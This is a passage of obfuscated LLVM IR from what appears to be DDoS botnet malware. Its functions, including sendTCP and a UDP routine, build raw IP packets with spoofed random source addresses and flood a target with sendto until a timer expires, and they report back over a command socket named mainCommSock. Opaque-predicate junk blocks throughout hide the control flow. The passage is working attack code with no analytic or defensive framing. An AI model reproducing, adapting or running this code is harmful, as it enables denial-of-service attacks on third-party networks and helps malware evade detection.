  call void @makeIPPacket(%struct.iphdr* %562, i32 %565, i32 %568, i8 zeroext 17, i32 %572)
  %573 = load i32, i32* %21, align 4
  %574 = sext i32 %573 to i64
  %_66 = sub i64 0, 8
  %gen67 = add i64 %_66, %574
  %_68 = shl i64 8, %574
  %_69 = sub i64 0, 8
  %gen70 = add i64 %_69, %574
  %_71 = sub i64 8, %574
  %gen72 = mul i64 %_71, %574
  %575 = add i64 8, %574
  %576 = trunc i64 %575 to i16
  %577 = call zeroext i16 @htons(i16 zeroext %576) #13
  %578 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %579 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %578, i32 0, i32 0
  %580 = bitcast %union.anon.2* %579 to %struct.anon.3*
  %581 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %580, i32 0, i32 2
  store i16 %577, i16* %581, align 2
  %582 = call i32 @rand_cmwc()
  %583 = trunc i32 %582 to i16
  %584 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %585 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %584, i32 0, i32 0
  %586 = bitcast %union.anon.2* %585 to %struct.anon.3*
  %587 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %586, i32 0, i32 0
  store i16 %583, i16* %587, align 2
  %588 = load i32, i32* %18, align 4
  %589 = icmp eq i32 %588, 0
  br label %originalBB52

originalBB76alteredBB:                            ; preds = %originalBB76, %372
  %590 = load i32, i32* %32, align 4
  %591 = bitcast %struct.sockaddr_in* %25 to %struct.sockaddr*
  %592 = call i64 @sendto(i32 %590, i8* %296, i64 %294, i32 0, %struct.sockaddr* %591, i32 16)
  %593 = call i32 @rand_cmwc()
  %594 = trunc i32 %593 to i16
  %595 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %596 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %595, i32 0, i32 0
  %597 = bitcast %union.anon.2* %596 to %struct.anon.3*
  %598 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %597, i32 0, i32 0
  store i16 %594, i16* %598, align 2
  %599 = load i32, i32* %18, align 4
  %600 = icmp eq i32 %599, 0
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %434
  %601 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %602 = load i32, i32* %39, align 4
  %603 = icmp sgt i32 %601, %602
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %456
  %604 = load i32, i32* %40, align 4
  %_85 = sub i32 0, %604
  %gen86 = add i32 %_85, 1
  %_87 = sub i32 0, %604
  %gen88 = add i32 %_87, 1
  %_89 = sub i32 %604, 1
  %gen90 = mul i32 %_89, 1
  %_91 = sub i32 0, %604
  %gen92 = add i32 %_91, 1
  %_93 = sub i32 0, %604
  %gen94 = add i32 %_93, 1
  %_95 = shl i32 %604, 1
  %_96 = shl i32 %604, 1
  %_97 = shl i32 %604, 1
  %_98 = shl i32 %604, 1
  %605 = add i32 %604, 1
  store i32 %605, i32* %40, align 4
  %606 = load i32, i32* %41, align 4
  %607 = load i32, i32* %23, align 4
  %608 = icmp eq i32 %606, %607
  br label %originalBB84

originalBB102alteredBB:                           ; preds = %originalBB102, %485
  %609 = load i8*, i8** %36, align 8
  call void @llvm.stackrestore(i8* %609)
  br label %originalBB102
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

declare i32 @usleep(i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %61

; <label>:44:                                     ; preds = %39
  %45 = load i32, i32* @x.65
  %46 = load i32, i32* @y.66
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %44
  %53 = load i32, i32* @x.65
  %54 = load i32, i32* @y.66
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %451

; <label>:61:                                     ; preds = %39
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %63 = getelementptr inbounds [8 x i8], [8 x i8]* %62, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %63, i8 0, i64 8, i32 4, i1 false)
  %64 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %64, i32* %17, align 4
  %65 = load i32, i32* %17, align 4
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %70, label %67

; <label>:67:                                     ; preds = %61
  %68 = load i32, i32* @mainCommSock, align 4
  %69 = call i32 (i32, i8*, ...) @sockprintf(i32 %68, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.87, i32 0, i32 0))
  br label %451

; <label>:70:                                     ; preds = %61
  store i32 1, i32* %18, align 4
  %71 = load i32, i32* %17, align 4
  %72 = bitcast i32* %18 to i8*
  %73 = call i32 @setsockopt(i32 %71, i32 0, i32 3, i8* %72, i32 4) #2
  %74 = icmp slt i32 %73, 0
  br i1 %74, label %75, label %78

; <label>:75:                                     ; preds = %70
  %76 = load i32, i32* @mainCommSock, align 4
  %77 = call i32 (i32, i8*, ...) @sockprintf(i32 %76, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.88, i32 0, i32 0))
  br label %451

; <label>:78:                                     ; preds = %70
  %79 = load i32, i32* %11, align 4
  %80 = icmp eq i32 %79, 0
  br i1 %80, label %81, label %82

; <label>:81:                                     ; preds = %78
  store i32 0, i32* %19, align 4
  br label %88

; <label>:82:                                     ; preds = %78
  %83 = load i32, i32* %11, align 4
  %84 = sub nsw i32 32, %83
  %85 = shl i32 1, %84
  %86 = sub nsw i32 %85, 1
  %87 = xor i32 %86, -1
  store i32 %87, i32* %19, align 4
  br label %88

; <label>:88:                                     ; preds = %82, %81
  %89 = load i32, i32* %13, align 4
  %90 = sext i32 %89 to i64
  %91 = add i64 40, %90
  %92 = call i8* @llvm.stacksave()
  store i8* %92, i8** %20, align 8
  %93 = alloca i8, i64 %91, align 16
  %94 = bitcast i8* %93 to %struct.iphdr*
  store %struct.iphdr* %94, %struct.iphdr** %21, align 8
  %95 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %96 = bitcast %struct.iphdr* %95 to i8*
  %97 = getelementptr i8, i8* %96, i64 20
  %98 = bitcast i8* %97 to %struct.tcphdr*
  store %struct.tcphdr* %98, %struct.tcphdr** %22, align 8
  %99 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %101 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %100, i32 0, i32 0
  %102 = load i32, i32* %101, align 4
  %103 = load i32, i32* %19, align 4
  %104 = call i32 @GetRandomIP(i32 %103)
  %105 = call i32 @htonl(i32 %104) #13
  %106 = load i32, i32* %13, align 4
  %107 = sext i32 %106 to i64
  %108 = add i64 20, %107
  %109 = trunc i64 %108 to i32
  call void @makeIPPacket(%struct.iphdr* %99, i32 %102, i32 %105, i8 zeroext 6, i32 %109)
  %110 = call i32 @rand_cmwc()
  %111 = trunc i32 %110 to i16
  %112 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %113 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %112, i32 0, i32 0
  %114 = bitcast %union.anon.0* %113 to %struct.anon.1*
  %115 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %114, i32 0, i32 0
  store i16 %111, i16* %115, align 4
  %116 = call i32 @rand_cmwc()
  %117 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %118 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %117, i32 0, i32 0
  %119 = bitcast %union.anon.0* %118 to %struct.anon.1*
  %120 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %119, i32 0, i32 2
  store i32 %116, i32* %120, align 4
  %121 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %122 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %121, i32 0, i32 0
  %123 = bitcast %union.anon.0* %122 to %struct.anon.1*
  %124 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %123, i32 0, i32 3
  store i32 0, i32* %124, align 4
  %125 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %126 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %125, i32 0, i32 0
  %127 = bitcast %union.anon.0* %126 to %struct.anon.1*
  %128 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %127, i32 0, i32 4
  %129 = load i16, i16* %128, align 4
  %130 = and i16 %129, -241
  %131 = or i16 %130, 80
  store i16 %131, i16* %128, align 4
  %132 = load i8*, i8** %12, align 8
  %133 = call i32 @strcmp(i8* %132, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i32 0, i32 0)) #10
  %134 = icmp ne i32 %133, 0
  br i1 %134, label %171, label %135

; <label>:135:                                    ; preds = %88
  %136 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %136, i32 0, i32 0
  %138 = bitcast %union.anon.0* %137 to %struct.anon.1*
  %139 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %138, i32 0, i32 4
  %140 = load i16, i16* %139, align 4
  %141 = and i16 %140, -513
  %142 = or i16 %141, 512
  store i16 %142, i16* %139, align 4
  %143 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %144 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %143, i32 0, i32 0
  %145 = bitcast %union.anon.0* %144 to %struct.anon.1*
  %146 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %145, i32 0, i32 4
  %147 = load i16, i16* %146, align 4
  %148 = and i16 %147, -1025
  %149 = or i16 %148, 1024
  store i16 %149, i16* %146, align 4
  %150 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %151 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %150, i32 0, i32 0
  %152 = bitcast %union.anon.0* %151 to %struct.anon.1*
  %153 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %152, i32 0, i32 4
  %154 = load i16, i16* %153, align 4
  %155 = and i16 %154, -257
  %156 = or i16 %155, 256
  store i16 %156, i16* %153, align 4
  %157 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %158 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %157, i32 0, i32 0
  %159 = bitcast %union.anon.0* %158 to %struct.anon.1*
  %160 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %159, i32 0, i32 4
  %161 = load i16, i16* %160, align 4
  %162 = and i16 %161, -4097
  %163 = or i16 %162, 4096
  store i16 %163, i16* %160, align 4
  %164 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %165 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %164, i32 0, i32 0
  %166 = bitcast %union.anon.0* %165 to %struct.anon.1*
  %167 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %166, i32 0, i32 4
  %168 = load i16, i16* %167, align 4
  %169 = and i16 %168, -2049
  %170 = or i16 %169, 2048
  store i16 %170, i16* %167, align 4
  br label %328

; <label>:171:                                    ; preds = %88
  %172 = load i8*, i8** %12, align 8
  %173 = call i8* @strtok(i8* %172, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0)) #2
  store i8* %173, i8** %23, align 8
  br label %174

; <label>:174:                                    ; preds = %309, %171
  %175 = load i8*, i8** %23, align 8
  %176 = icmp ne i8* %175, null
  br i1 %176, label %177, label %311

; <label>:177:                                    ; preds = %174
  %178 = load i8*, i8** %23, align 8
  %179 = call i32 @strcmp(i8* %178, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.91, i32 0, i32 0)) #10
  %180 = icmp ne i32 %179, 0
  br i1 %180, label %189, label %181

; <label>:181:                                    ; preds = %177
  %182 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %183 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %182, i32 0, i32 0
  %184 = bitcast %union.anon.0* %183 to %struct.anon.1*
  %185 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %184, i32 0, i32 4
  %186 = load i16, i16* %185, align 4
  %187 = and i16 %186, -513
  %188 = or i16 %187, 512
  store i16 %188, i16* %185, align 4
  br label %309

; <label>:189:                                    ; preds = %177
  %190 = load i8*, i8** %23, align 8
  %191 = call i32 @strcmp(i8* %190, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.92, i32 0, i32 0)) #10
  %192 = icmp ne i32 %191, 0
  br i1 %192, label %201, label %193

; <label>:193:                                    ; preds = %189
  %194 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 0
  %196 = bitcast %union.anon.0* %195 to %struct.anon.1*
  %197 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %196, i32 0, i32 4
  %198 = load i16, i16* %197, align 4
  %199 = and i16 %198, -1025
  %200 = or i16 %199, 1024
  store i16 %200, i16* %197, align 4
  br label %292

; <label>:201:                                    ; preds = %189
  %202 = load i8*, i8** %23, align 8
  %203 = call i32 @strcmp(i8* %202, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.93, i32 0, i32 0)) #10
  %204 = icmp ne i32 %203, 0
  br i1 %204, label %229, label %205

; <label>:205:                                    ; preds = %201
  %206 = load i32, i32* @x.65
  %207 = load i32, i32* @y.66
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %205
  %214 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  %216 = bitcast %union.anon.0* %215 to %struct.anon.1*
  %217 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = and i16 %218, -257
  %220 = or i16 %219, 256
  store i16 %220, i16* %217, align 4
  %221 = load i32, i32* @x.65
  %222 = load i32, i32* @y.66
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBBpart26, label %originalBB1alteredBB

originalBBpart26:                                 ; preds = %originalBB1
  br label %291

; <label>:229:                                    ; preds = %201
  %230 = load i8*, i8** %23, align 8
  %231 = call i32 @strcmp(i8* %230, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.94, i32 0, i32 0)) #10
  %232 = icmp ne i32 %231, 0
  br i1 %232, label %241, label %233

; <label>:233:                                    ; preds = %229
  %234 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 0
  %236 = bitcast %union.anon.0* %235 to %struct.anon.1*
  %237 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = and i16 %238, -4097
  %240 = or i16 %239, 4096
  store i16 %240, i16* %237, align 4
  br label %274

; <label>:241:                                    ; preds = %229
  %242 = load i32, i32* @x.65
  %243 = load i32, i32* @y.66
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %241
  %250 = load i8*, i8** %23, align 8
  %251 = call i32 @strcmp(i8* %250, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.95, i32 0, i32 0)) #10
  %252 = icmp ne i32 %251, 0
  %253 = load i32, i32* @x.65
  %254 = load i32, i32* @y.66
  %255 = sub i32 %253, 1
  %256 = mul i32 %253, %255
  %257 = urem i32 %256, 2
  %258 = icmp eq i32 %257, 0
  %259 = icmp slt i32 %254, 10
  %260 = or i1 %258, %259
  br i1 %260, label %originalBBpart210, label %originalBB8alteredBB

originalBBpart210:                                ; preds = %originalBB8
  br i1 %252, label %269, label %261

; <label>:261:                                    ; preds = %originalBBpart210
  %262 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %263 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %262, i32 0, i32 0
  %264 = bitcast %union.anon.0* %263 to %struct.anon.1*
  %265 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %264, i32 0, i32 4
  %266 = load i16, i16* %265, align 4
  %267 = and i16 %266, -2049
  %268 = or i16 %267, 2048
  store i16 %268, i16* %265, align 4
  br label %273

; <label>:269:                                    ; preds = %originalBBpart210
  %270 = load i32, i32* @mainCommSock, align 4
  %271 = load i8*, i8** %23, align 8
  %272 = call i32 (i32, i8*, ...) @sockprintf(i32 %270, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.96, i32 0, i32 0), i8* %271)
  br label %273

; <label>:273:                                    ; preds = %269, %261
  br label %274

; <label>:274:                                    ; preds = %273, %233
  %275 = load i32, i32* @x.65
  %276 = load i32, i32* @y.66
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %274
  %283 = load i32, i32* @x.65
  %284 = load i32, i32* @y.66
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br label %291

; <label>:291:                                    ; preds = %originalBBpart214, %originalBBpart26
  br label %292

; <label>:292:                                    ; preds = %291, %193
  %293 = load i32, i32* @x.65
  %294 = load i32, i32* @y.66
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %292
  %301 = load i32, i32* @x.65
  %302 = load i32, i32* @y.66
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %309

; <label>:309:                                    ; preds = %originalBBpart218, %181
  %310 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %310, i8** %23, align 8
  br label %174

; <label>:311:                                    ; preds = %174
  %312 = load i32, i32* @x.65
  %313 = load i32, i32* @y.66
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %311
  %320 = load i32, i32* @x.65
  %321 = load i32, i32* @y.66
  %322 = sub i32 %320, 1
  %323 = mul i32 %320, %322
  %324 = urem i32 %323, 2
  %325 = icmp eq i32 %324, 0
  %326 = icmp slt i32 %321, 10
  %327 = or i1 %325, %326
  br i1 %327, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br label %328

; <label>:328:                                    ; preds = %originalBBpart222, %135
  %329 = call i32 @rand_cmwc()
  %330 = trunc i32 %329 to i16
  %331 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %332 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %331, i32 0, i32 0
  %333 = bitcast %union.anon.0* %332 to %struct.anon.1*
  %334 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %333, i32 0, i32 5
  store i16 %330, i16* %334, align 2
  %335 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %336 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %335, i32 0, i32 0
  %337 = bitcast %union.anon.0* %336 to %struct.anon.1*
  %338 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %337, i32 0, i32 6
  store i16 0, i16* %338, align 4
  %339 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %340 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %339, i32 0, i32 0
  %341 = bitcast %union.anon.0* %340 to %struct.anon.1*
  %342 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %341, i32 0, i32 7
  store i16 0, i16* %342, align 2
  %343 = load i32, i32* %9, align 4
  %344 = icmp eq i32 %343, 0
  br i1 %344, label %345, label %347

; <label>:345:                                    ; preds = %328
  %346 = call i32 @rand_cmwc()
  br label %352

; <label>:347:                                    ; preds = %328
  %348 = load i32, i32* %9, align 4
  %349 = trunc i32 %348 to i16
  %350 = call zeroext i16 @htons(i16 zeroext %349) #13
  %351 = zext i16 %350 to i32
  br label %352

; <label>:352:                                    ; preds = %347, %345
  %353 = phi i32 [ %346, %345 ], [ %351, %347 ]
  %354 = trunc i32 %353 to i16
  %355 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %356 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %355, i32 0, i32 0
  %357 = bitcast %union.anon.0* %356 to %struct.anon.1*
  %358 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %357, i32 0, i32 1
  store i16 %354, i16* %358, align 2
  %359 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %360 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %361 = call zeroext i16 @tcpcsum(%struct.iphdr* %359, %struct.tcphdr* %360)
  %362 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %363 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %362, i32 0, i32 0
  %364 = bitcast %union.anon.0* %363 to %struct.anon.1*
  %365 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %364, i32 0, i32 6
  store i16 %361, i16* %365, align 4
  %366 = bitcast i8* %93 to i16*
  %367 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %368 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %367, i32 0, i32 2
  %369 = load i16, i16* %368, align 2
  %370 = zext i16 %369 to i32
  %371 = call zeroext i16 @csum(i16* %366, i32 %370)
  %372 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %373 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %372, i32 0, i32 7
  store i16 %371, i16* %373, align 2
  %374 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %375 = load i32, i32* %10, align 4
  %376 = add nsw i32 %374, %375
  store i32 %376, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %377

; <label>:377:                                    ; preds = %446, %445, %352
  br label %378

; <label>:378:                                    ; preds = %377
  %379 = load i32, i32* %17, align 4
  %380 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %381 = call i64 @sendto(i32 %379, i8* %93, i64 %91, i32 0, %struct.sockaddr* %380, i32 16)
  %382 = load i32, i32* %19, align 4
  %383 = call i32 @GetRandomIP(i32 %382)
  %384 = call i32 @htonl(i32 %383) #13
  %385 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %386 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %385, i32 0, i32 8
  store i32 %384, i32* %386, align 4
  %387 = call i32 @rand_cmwc()
  %388 = trunc i32 %387 to i16
  %389 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 3
  store i16 %388, i16* %390, align 4
  %391 = call i32 @rand_cmwc()
  %392 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %393 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %392, i32 0, i32 0
  %394 = bitcast %union.anon.0* %393 to %struct.anon.1*
  %395 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %394, i32 0, i32 2
  store i32 %391, i32* %395, align 4
  %396 = call i32 @rand_cmwc()
  %397 = trunc i32 %396 to i16
  %398 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %399 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %398, i32 0, i32 0
  %400 = bitcast %union.anon.0* %399 to %struct.anon.1*
  %401 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %400, i32 0, i32 0
  store i16 %397, i16* %401, align 4
  %402 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i32 0, i32 0
  %404 = bitcast %union.anon.0* %403 to %struct.anon.1*
  %405 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %404, i32 0, i32 6
  store i16 0, i16* %405, align 4
  %406 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %407 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %408 = call zeroext i16 @tcpcsum(%struct.iphdr* %406, %struct.tcphdr* %407)
  %409 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %410 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %409, i32 0, i32 0
  %411 = bitcast %union.anon.0* %410 to %struct.anon.1*
  %412 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %411, i32 0, i32 6
  store i16 %408, i16* %412, align 4
  %413 = bitcast i8* %93 to i16*
  %414 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 2
  %416 = load i16, i16* %415, align 2
  %417 = zext i16 %416 to i32
  %418 = call zeroext i16 @csum(i16* %413, i32 %417)
  %419 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 7
  store i16 %418, i16* %420, align 2
  %421 = load i32, i32* %25, align 4
  %422 = load i32, i32* %15, align 4
  %423 = icmp eq i32 %421, %422
  br i1 %423, label %424, label %446

; <label>:424:                                    ; preds = %378
  %425 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %426 = load i32, i32* %24, align 4
  %427 = icmp sgt i32 %425, %426
  br i1 %427, label %428, label %445

